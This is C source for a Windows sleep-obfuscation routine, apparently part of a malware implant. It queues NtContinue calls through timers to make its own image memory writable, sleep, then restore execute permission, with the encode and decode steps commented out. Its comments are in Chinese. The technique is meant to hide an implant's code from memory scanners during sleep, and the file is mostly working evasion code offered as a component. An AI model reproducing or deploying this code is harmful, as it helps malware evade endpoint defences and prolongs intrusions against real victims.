#include "SleepObf.h"
#include "PEBWalk.h"
#include "Memory.h"
#include "NativeDefs.h"

void TimerInfo() {
    uint64_t C = 0;
    uint64_t* CADDRESS = &C;
    for (int i = 0; i < 20; i++) {
        printf("0x%llx\n", CADDRESS[i]);
    }
}

bool EventSet(void* event) {
    if (!API.NtSetEvent(event, 0)) {
        return true;
    }

    return false;
}


// 设定事件，用于等待保证运行顺序
void* EvtWait = 0;
void* EvtAwake = 0;


void SleepObf(uint32_t time) {
    if (time < 100) {
        return;
    }

    struct CONTEXT OriginCtx = { 0 };
    struct CONTEXT ProtRW = { 0 };
    struct CONTEXT Encode = { 0 };
    struct CONTEXT ToSleep = { 0 };
    struct CONTEXT Decode = { 0 };
    struct CONTEXT ProtRX = { 0 };
    struct CONTEXT Awaking = { 0 };

    // 创建 Timer 队列
    void* hTimerQueue;
    if (API.RtlCreateTimerQueue(&hTimerQueue) >= 0 ) {
        if (API.NtCreateEvent(&EvtWait, 0x1F0003, 0, NotificationEvent, false) >= 0 &&
            API.NtCreateEvent(&EvtAwake, 0x1F0003, 0, NotificationEvent, false) >= 0
        ) {
            void* hTimer[8] = { 0 };
            if (API.RtlCreateTimer(hTimerQueue , &hTimer[0], (WAITORTIMERCALLBACK)API.RtlCaptureContext, (void*)&OriginCtx, 0, 0, 0x00000020) >= 0) {
                
                API.RtlCreateTimer(hTimerQueue, &hTimer[1], (WAITORTIMERCALLBACK)EventSet, EvtWait, 50, 0, 0x000000C);

                API.WaitForSingleObjectEx(EvtWait, 0xFFFFFFFF, false);

                OriginCtx.Rsp -= 8;

                // 开始布置睡眠混淆
                MemCopy(&ProtRW, &OriginCtx, sizeof(struct CONTEXT));
                MemCopy(&Encode, &OriginCtx, sizeof(struct CONTEXT));
                MemCopy(&ToSleep, &OriginCtx, sizeof(struct CONTEXT));
                MemCopy(&Decode, &OriginCtx, sizeof(struct CONTEXT));
                MemCopy(&ProtRX, &OriginCtx, sizeof(struct CONTEXT));
                MemCopy(&Awaking, &OriginCtx, sizeof(struct CONTEXT));

                uint64_t ProtVal = 0;
                ProtRW.Rip = API.VirtualProtect;
                ProtRW.Rcx = ImageAddress;
                ProtRW.Rdx = ImageSize;
                ProtRW.R8 = 0x04;  // PAGE_READWRITE
                ProtRW.R9 = &ProtVal;

                ToSleep.Rip = API.WaitForSingleObjectEx;
                ToSleep.Rcx = -1;
                ToSleep.Rdx = time;
                ToSleep.R8 = false;

                ProtRX.Rip = API.VirtualProtect;
                ProtRX.Rcx = TextAddress;
                ProtRX.Rdx = TextSize;
                ProtRX.R8 = 0x20;  // PAGE_EXECUTE_READ
                ProtRX.R9 = &ProtVal;

                Awaking.Rip = API.NtSetEvent;
                Awaking.Rcx = EvtAwake;
                Awaking.Rdx = 0;

                // 使用 NtContinue 来触发各种任务
                API.RtlCreateTimer(hTimerQueue, &hTimer[2], (WAITORTIMERCALLBACK)API.NtContinue, &ProtRW, 100, 0, 0x00000020);
                // API.RtlCreateTimer(hTimerQueue, &hTimer[3], (WAITORTIMERCALLBACK)API.NtContinue, &Encode, 200, 0, 0x00000020);
                API.RtlCreateTimer(hTimerQueue, &hTimer[4], (WAITORTIMERCALLBACK)API.NtContinue, &ToSleep, 300, 0, 0x00000020);
                // API.RtlCreateTimer(hTimerQueue, &hTimer[5], (WAITORTIMERCALLBACK)API.NtContinue, &Decode, 400, 0, 0x00000020);
                API.RtlCreateTimer(hTimerQueue, &hTimer[6], (WAITORTIMERCALLBACK)API.NtContinue, &ProtRX, 500, 0, 0x00000020);
                API.RtlCreateTimer(hTimerQueue, &hTimer[7], (WAITORTIMERCALLBACK)API.NtContinue, &Awaking, 600, 0, 0x00000020);

                // 等待任务完成
                API.WaitForSingleObjectEx(EvtAwake, 0xFFFFFFFF, false);
            }
            if (EvtWait) {
                API.NtClose(EvtWait);
                EvtWait = 0;
            }
            if (EvtAwake) {
                API.NtClose(EvtAwake);
                EvtAwake = 0;
            }
        }
        if (hTimerQueue) {
            API.RtlDeleteTimerQueueEx(hTimerQueue, -1);
            hTimerQueue = 0;
        }
    }
}